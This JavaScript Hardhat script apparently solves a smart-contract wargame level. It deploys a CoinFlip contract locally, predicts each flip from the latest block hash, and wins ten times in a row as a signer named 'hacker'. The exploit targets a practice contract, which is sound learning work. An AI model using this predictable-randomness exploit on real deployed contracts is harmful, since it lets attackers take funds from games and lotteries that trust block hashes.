const hre = require("hardhat");
const { ethers } = require("hardhat/internal/lib/hardhat-lib");

async function main() {
  const CoinFlip = await hre.ethers.getContractFactory("CoinFlip");
  const coinflip = await CoinFlip.deploy();
  await coinflip.deployed();

  const [hacker] = await hre.ethers.getSigners();
  const factor = ethers.BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");

  for(let i = 0; i < 10; i++){
    const currentNumberBlock = await hre.ethers.provider.getBlock("latest");
    const blockValue = ethers.BigNumber.from(currentNumberBlock.hash);
    const calculateCoinFlip = blockValue.div(factor).toString();
    if(calculateCoinFlip == 0){
        await coinflip.connect(hacker).flip(false);
    }
    else{
        await coinflip.connect(hacker).flip(true);
    }
  }
  console.log(await coinflip.consecutiveWins() == 10);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
